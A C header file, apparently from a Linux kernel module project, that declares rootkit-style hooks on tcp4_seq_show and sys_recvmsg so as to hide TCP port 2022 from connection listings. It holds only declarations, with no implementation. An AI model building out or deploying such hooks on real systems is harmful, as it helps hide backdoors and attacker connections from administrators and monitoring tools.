//
// Created by sciver on 10/19/22.
//

#ifndef LINUX_KERNEL_MODULE_WITH_CLION_IDE_SUPPORT_CMAKE_HIDE_PORT_H
#define LINUX_KERNEL_MODULE_WITH_CLION_IDE_SUPPORT_CMAKE_HIDE_PORT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/inet_diag.h> /* Needed for ntohs */
#include <linux/tcp.h>
#include <linux/inet_diag.h> /* Needed for ntohs */
#include <net/tcp.h>         // struct tcp_seq_afinfo.

#define PORT_TO_BE_HIDE 2022


extern asmlinkage ssize_t (*real_sys_recvmsg)(const struct pt_regs *regs);
/* Function declaration for the original tcp4_seq_show() function that we
 * are going to hook.
 * */
extern asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

asmlinkage long fake_tcp4_seq_show(struct seq_file *seq, void *v);
asmlinkage ssize_t fake_sys_recvmsg(const struct pt_regs *regs);
#endif //LINUX_KERNEL_MODULE_WITH_CLION_IDE_SUPPORT_CMAKE_HIDE_PORT_H
